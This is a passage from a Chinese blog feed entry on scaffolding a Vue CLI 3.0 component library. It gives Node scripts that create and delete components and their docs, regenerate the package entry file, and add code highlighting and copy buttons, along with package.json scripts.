</span><span><span>${</span>entryComponentName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>generateFile</span><span>(</span>entryComponentName<span>,</span> <span>entryTemplate</span><span>(</span>componentName<span>)</span><span>)</span><span>;</span>\n      <span>successLog</span><span>(</span><span>\"生成 component 成功\"</span><span>)</span><span>;</span>\n    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>\n      <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>\n    <span>}</span>\n  <span>}</span> <span>else</span> <span>{</span>\n    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n\n  <span>// 这里生成自定义组件说明文档</span>\n  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../examples/docs\"</span><span>)</span><span>;</span>\n  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>\n\n  <span>try</span> <span>{</span>\n    <span>log</span><span>(</span><span><span>`</span><span>生成 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n    <span>await</span> <span>generateFile</span><span>(</span>docsMdName<span>,</span> <span>mdDocs</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span> 组件</span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n    <span>successLog</span><span>(</span><span>\"生成 component 文档成功\"</span><span>)</span><span>;</span>\n  <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>\n    <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>\n  <span>}</span>\n\n  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>\"end\"</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"end\"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>function</span> <span>dotExistDirectoryCreate</span><span>(</span><span>directory</span><span>)</span> <span>{</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve</span><span>)</span> <span>=></span> <span>{</span>\n    <span>mkdirs</span><span>(</span>directory<span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n      <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>// 递归创建目录</span>\n<span>function</span> <span>mkdirs</span><span>(</span><span>directory<span>,</span> callback</span><span>)</span> <span>{</span>\n  <span>var</span> exists <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>directory<span>)</span><span>;</span>\n  <span>if</span> <span>(</span>exists<span>)</span> <span>{</span>\n    <span>callback</span><span>(</span><span>)</span><span>;</span>\n  <span>}</span> <span>else</span> <span>{</span>\n    <span>mkdirs</span><span>(</span>path<span>.</span><span>dirname</span><span>(</span>directory<span>)</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n      fs<span>.</span><span>mkdirSync</span><span>(</span>directory<span>)</span><span>;</span>\n      <span>callback</span><span>(</span><span>)</span><span>;</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>delete-comp.js</code></p>\n<div><pre><code><span>// 删除自定义组件脚本</span>\n\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs-extra\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>\n<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n\n<span>log</span><span>(</span><span>\"请输入要删除的组件名称, 形如 demo 或者 demo-test\"</span><span>)</span><span>;</span>\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"data\"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>\n  <span>let</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>\n  inputName <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>\n  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../packages\"</span><span>,</span> inputName<span>)</span><span>;</span>\n\n  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n\n  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../examples/docs\"</span><span>)</span><span>;</span>\n  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>\n  <span>if</span> <span>(</span>inputName<span>)</span> <span>{</span>\n    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>\n      <span>log</span><span>(</span><span><span>`</span><span>删除 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>removePromise</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件目录</span><span>`</span></span><span>)</span><span>;</span>\n\n      <span>log</span><span>(</span><span><span>`</span><span>删除 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      fs<span>.</span><span>unlink</span><span>(</span>docsMdName<span>)</span><span>;</span>\n      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件说明文档</span><span>`</span></span><span>)</span><span>;</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>组件目录不存在</span><span>`</span></span><span>)</span><span>;</span>\n      <span>return</span><span>;</span>\n    <span>}</span>\n  <span>}</span> <span>else</span> <span>{</span>\n    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n\n  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>\"end\"</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"end\"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>function</span> <span>removePromise</span><span>(</span><span>dir</span><span>)</span> <span>{</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>{</span>\n    <span>// 先读文件夹</span>\n    fs<span>.</span><span>stat</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> stat</span><span>)</span> <span>{</span>\n      <span>if</span> <span>(</span>stat<span>.</span><span>isDirectory</span><span>(</span><span>)</span><span>)</span> <span>{</span>\n        fs<span>.</span><span>readdir</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> files</span><span>)</span> <span>{</span>\n          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>dir<span>,</span> file<span>)</span><span>)</span><span>;</span> <span>// a/b  a/m</span>\n          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> <span>removePromise</span><span>(</span>file<span>)</span><span>)</span><span>;</span> <span>// 这时候变成了promise</span>\n          Promise<span>.</span><span>all</span><span>(</span>files<span>)</span><span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n            fs<span>.</span><span>rmdir</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span><span>)</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        fs<span>.</span><span>unlink</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>template.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n    <span>vueTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n\n        compoenntName <span>=</span> compoenntName<span>.</span><span>charAt</span><span>(</span><span>0</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span> <span>+</span> compoenntName<span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span>\n        <span>return</span> <span><span>`</span><span>&lt;template>\n\n  &lt;divtoken interpolation\"><span>${</span>compoenntName<span>}</span></span><span>\">\n\n    </span><span><span>${</span>compoenntName<span>}</span></span><span>\n\n  &lt;/div>\n&lt;/template>\n\n&lt;script>\nexport default {\n  name: 'vtp-</span><span><span>${</span>compoenntName<span>}</span></span><span>',\n\n  data () {\n\n    return {\n    }\n\n  },\n\n  props: {\n\n  },\n\n  methods: {}\n}\n&lt;/script>\n\n&lt;style lang=\"scss\" scope>\n.vtp-</span><span><span>${</span>compoenntName<span>}</span></span><span>{}\n&lt;/style>\n</span><span>`</span></span>\n    <span>}</span><span>,</span>\n    <span>entryTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n\n        <span>return</span> <span><span>`</span><span>import </span><span><span>${</span>compoenntName<span>}</span></span><span> from './</span><span><span>${</span>compoenntName<span>}</span></span><span>'\n\n</span><span><span>${</span>compoenntName<span>}</span></span><span>.install = function (Vue) {\n  Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)\n}\n\nexport default </span><span><span>${</span>compoenntName<span>}</span></span><span>\n\nif (typeof window !== 'undefined' &amp;&amp; window.Vue) {\n  window.Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)\n}\n</span><span>`</span></span>\n    <span>}</span><span>,</span>\n    <span>mdDocs</span><span>:</span> <span>(</span><span>title</span><span>)</span> <span>=></span> <span>{</span>\n\n        <span>return</span> <span><span>`</span><span>## </span><span><span>${</span>title<span>}</span></span><span>\n\n&lt;!-- {.md} -->\n\n---\n&lt;!-- {.md} -->\n\n### 如何使用\n\n&lt;!-- {.md} -->\n\n### Attributes\n\n&lt;!-- {.md} -->\n\n| 参数 | 说明 | 类型 | 可选值 | 默认值 |\n| ---- | ---- | ---- | ------ | ------ |\n| -    | -    | -    | -      | -      |\n    }\n}\n</span><span>`</span></span>\n    <span>}</span><span>,</span>\n    <span>entryTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n        <span>return</span> <span><span>`</span><span>import </span><span><span>${</span>compoenntName<span>}</span></span><span> from './</span><span><span>${</span>compoenntName<span>}</span></span><span>'\n\n$ {compoenntName}.install = function(Vue) {\n    Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>)</span>\n<span>}</span></span><span>\n\nexport default </span><span><span>${</span>compoenntName<span>}</span></span><span>\n\nif (typeof window !== 'undefined' &amp;&amp; window.Vue) {\n    window.Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)\n}\n</span><span>`</span></span>\n    <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在 <code>build</code> 中创建以下几个文件, 其中 <code>build-entry.js</code> 脚本是用来生成自定义组件导出 <code>packages/index.js</code> , <code>get-components.js</code> 脚本是用来获取 <code>packages</code> 目录下的所有组件</p>\n<div><pre><code>|--- build-entry.js\n|\n|--- get-components.js\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href=\"https://github.com/Eamonnzhang/vue-cards\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cards</a></p>\n<p><code>build-entry.js</code></p>\n<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs-extra\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n<span>const</span> Components <span>=</span> <span>require</span><span>(</span><span>\"./get-components\"</span><span>)</span><span>(</span><span>)</span><span>;</span>\n<span>const</span> packageJson <span>=</span> <span>require</span><span>(</span><span>\"../package.json\"</span><span>)</span><span>;</span>\n<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n\n<span>const</span> version <span>=</span> process<span>.</span>env<span>.</span><span>VERSION</span> <span>||</span> packageJson<span>.</span>version<span>;</span>\n\n<span>function</span> <span>buildPackagesEntry</span><span>(</span><span>)</span> <span>{</span>\n  <span>const</span> uninstallComponents <span>=</span> <span>[</span><span>]</span><span>;</span>\n\n  <span>const</span> importList <span>=</span> Components<span>.</span><span>map</span><span>(</span>\n    <span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span>import </span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span> from './</span><span><span>${</span>name<span>}</span></span><span>'</span><span>`</span></span>\n  <span>)</span><span>;</span>\n  <span>const</span> exportList <span>=</span> Components<span>.</span><span>map</span><span>(</span><span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n  <span>const</span> intallList <span>=</span> exportList<span>.</span><span>filter</span><span>(</span>\n    <span>(</span><span>name</span><span>)</span> <span>=></span> <span>!</span><span>~</span>uninstallComponents<span>.</span><span>indexOf</span><span>(</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>)</span>\n  <span>)</span><span>;</span>\n  <span>const</span> content <span>=</span> <span><span>`</span><span>import 'normalize.css'\n    \n</span><span><span>${</span>importList<span>.</span><span>join</span><span>(</span><span>\"\\n\"</span><span>)</span><span>}</span></span><span>\n\nconst version = '</span><span><span>${</span>version<span>}</span></span><span>'\nconst components = [\n  </span><span><span>${</span>intallList<span>.</span><span>join</span><span>(</span><span>\", \\n  \"</span><span>)</span><span>}</span></span><span>\n]\n\nconst install = Vue => {\n  if (install.installed) return\n  components.map(component => Vue.component(component.name, component))\n}\n\nif (typeof window !== 'undefined' &amp;&amp; window.Vue) {\n  install(window.Vue)\n}\n\nexport {\n  install, \n  version, \n  </span><span><span>${</span>exportList<span>.</span><span>join</span><span>(</span><span>\", \\n  \"</span><span>)</span><span>}</span></span><span>\n}\n\nexport default {\n  install, \n  version, \n  ...components\n}\n</span><span>`</span></span><span>;</span>\n\n  fs<span>.</span><span>writeFileSync</span><span>(</span>path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"../packages/index.js\"</span><span>)</span><span>,</span> content<span>)</span><span>;</span>\n  <span>log</span><span>(</span><span>\"packages/index.js 文件已更新依赖\"</span><span>)</span><span>;</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>buildPackagesEntry</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>get-components.js</code></p>\n<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n\n<span>const</span> excludes <span>=</span> <span>[</span><span>\"index.js\"</span><span>,</span> <span>\"theme-chalk\"</span><span>,</span> <span>\"mixins\"</span><span>,</span> <span>\"utils\"</span><span>,</span> <span>\".DS_Store\"</span><span>]</span><span>;</span>\n\nmodule<span>.</span><span>exports</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n  <span>const</span> dirs <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../packages\"</span><span>)</span><span>)</span><span>;</span>\n  <span>return</span> dirs<span>.</span><span>filter</span><span>(</span><span>(</span><span>dirName</span><span>)</span> <span>=></span> excludes<span>.</span><span>indexOf</span><span>(</span>dirName<span>)</span> <span>===</span> <span>-</span><span>1</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"让-vue-解析-markdown\" tabindex=\"-1\"> 让 vue 解析 markdown</h4>\n<div><p>提示</p>\n<p>文档中心的 UI 是如何编码的这里不做阐述, 小主可以自行参照 <a href=\"https://github.com/Eamonnzhang/vue-cards\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cards</a> 中的实现方式进行改造</p>\n</div>\n<p>需要安装以下的依赖, 让 vue 解析 markdown</p>\n<div><pre><code><span>npm</span> i markdown-it-container -D\n<span>npm</span> i markdown-it-decorate -D\n<span>npm</span> i markdown-it-task-checkbox -D\n<span>npm</span> i vue-markdown-loader -D\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>关于 vue.config.js 的配置在 <a href=\"https://github.com/Eamonnzhang/vue-cards\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cards</a> 该项目中也有了, 不做阐述</p>\n<p>这里将补充高亮 <code>highlight.js</code> 以及点击复制代码 <code>clipboard</code> 的实现方式</p>\n<p>安装依赖</p>\n<div><pre><code><span>npm</span> i clipboard highlight.js\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>改造 <code>App.vue</code> , 以下只是列出部分代码, 小主可以根据自己的需求进行添加</p>\n<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n  <span>import</span> hljs <span>from</span> <span>\"highlight.js\"</span><span>;</span>\n  <span>import</span> Clipboard <span>from</span> <span>\"clipboard\"</span><span>;</span>\n\n  <span>const</span> <span>highlightCode</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n    <span>const</span> preEl <span>=</span> document<span>.</span><span>querySelectorAll</span><span>(</span><span>\"pre\"</span><span>)</span><span>;</span>\n\n    preEl<span>.</span><span>forEach</span><span>(</span><span>(</span><span>el<span>,</span> index</span><span>)</span> <span>=></span> <span>{</span>\n      hljs<span>.</span><span>highlightBlock</span><span>(</span>el<span>)</span><span>;</span>\n\n      <span>const</span> lang <span>=</span> el<span>.</span>children<span>[</span><span>0</span><span>]</span><span>.</span>className<span>.</span><span>split</span><span>(</span><span>\" \"</span><span>)</span><span>[</span><span>1</span><span>]</span><span>.</span><span>split</span><span>(</span><span>\"-\"</span><span>)</span><span>[</span><span>1</span><span>]</span><span>;</span>\n      <span>const</span> pre <span>=</span> el<span>;</span>\n      <span>const</span> span <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>\"span\"</span><span>)</span><span>;</span>\n      span<span>.</span><span>setAttribute</span><span>(</span><span>\"class\"</span><span>,</span> <span>\"code-copy\"</span><span>)</span><span>;</span>\n      span<span>.</span><span>setAttribute</span><span>(</span><span>\"data-clipboard-snippet\"</span><span>,</span> <span>\"\"</span><span>)</span><span>;</span>\n      span<span>.</span>innerHTML <span>=</span> <span><span>`</span><span><span>${</span>lang<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>}</span></span><span> | COPY</span><span>`</span></span><span>;</span>\n      pre<span>.</span><span>appendChild</span><span>(</span>span<span>)</span><span>;</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>;</span>\n\n  <span>export</span> <span>default</span> <span>{</span>\n    <span>name</span><span>:</span> <span>\"App\"</span><span>,</span>\n\n    <span>mounted</span><span>(</span><span>)</span> <span>{</span>\n      <span>if</span> <span>(</span><span>\"onhashchange\"</span> <span>in</span> window<span>)</span> <span>{</span>\n        window<span>.</span><span>onhashchange</span> <span>=</span> <span>function</span> <span>(</span><span>ev</span><span>)</span> <span>{</span>\n          <span>let</span> name <span>=</span> window<span>.</span>location<span>.</span>hash<span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span><span>;</span>\n          router<span>.</span><span>push</span><span>(</span><span>{</span>\n            name<span>,</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span><span>;</span>\n      <span>}</span>\n\n      <span>highlightCode</span><span>(</span><span>)</span><span>;</span>\n\n      <span>let</span> clipboard <span>=</span> <span>new</span> <span>Clipboard</span><span>(</span><span>\".code-copy\"</span><span>,</span> <span>{</span>\n        <span>text</span><span>:</span> <span>(</span><span>trigger</span><span>)</span> <span>=></span> <span>{</span>\n          <span>return</span> trigger<span>.</span>previousSibling<span>.</span>innerText<span>;</span>\n        <span>}</span><span>,</span>\n      <span>}</span><span>)</span><span>;</span>\n      <span>// 复制成功执行的回调</span>\n      clipboard<span>.</span><span>on</span><span>(</span><span>\"success\"</span><span>,</span> <span>(</span><span>e</span><span>)</span> <span>=></span> <span>{</span>\n        e<span>.</span>trigger<span>.</span>innerHTML <span>=</span> <span><span>`</span><span>已复制</span><span>`</span></span><span>;</span>\n      <span>}</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n\n    <span>updated</span><span>(</span><span>)</span> <span>{</span>\n      <span>highlightCode</span><span>(</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"生成命令\" tabindex=\"-1\"> 生成命令</h4>\n<p>在 <code>package.json</code> 中添加以下内容, 使用命令 <code>yarn new:comp</code> 创建组件目录及其文档或者使用命令 <code>yarn del:comp</code> 即可删除组件目录及其文档</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"new:comp\"</span><span>:</span> <span>\"node scripts/create-comp.js &amp;&amp; node build/build-entry.js\"</span><span>,</span>\n    <span>\"del:comp\"</span><span>:</span> <span>\"node scripts/delete-comp.js &amp;&amp; node build/build-entry.js\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"changelog\" tabindex=\"-1\"> changelog</h2>\n<p>在 <code>package.json</code> 中修改 script 字段, 接下来你懂的, 另一篇博客有介绍哦, 小主可以执行搜索</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"init\"</span><span>:</span> <span>\"npm install commitizen -g &amp;&amp; commitizen init cz-conventional-changelog --save-dev --save-exact &amp;&amp; npm run bootstrap\"</span><span>,</span>\n    <span>\"bootstrap\"</span><span>:</span> <span>\"npm install\"</span><span>,</span>\n    <span>\"changelog\"</span><span>:</span> <span>\"conventional-changelog -p angular -i CHANGELOG.md -s -r 0\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2019-04-28T17:19:49.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "vuejs"
      ]
    },
    {
      "title": "使用 Vue cli 3.0 构建自定义组件库(第二弹)",
      "url": "https://vxhly.github.io/views/vuejs/custom-component-library-second.html",
      "id": "https://vxhly.github.io/views/vuejs/custom-component-library-second.html",
      "summary": "前言\n本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本的小伙伴, 想必都知道第一弹版本的组件库文档 UI 是需要自己写的, 最近也是刚研究出来其实 vuepress 也可以作为组件库文档的 UI, 该文档 UI 绝对不输于第一弹版本的。\n\n",
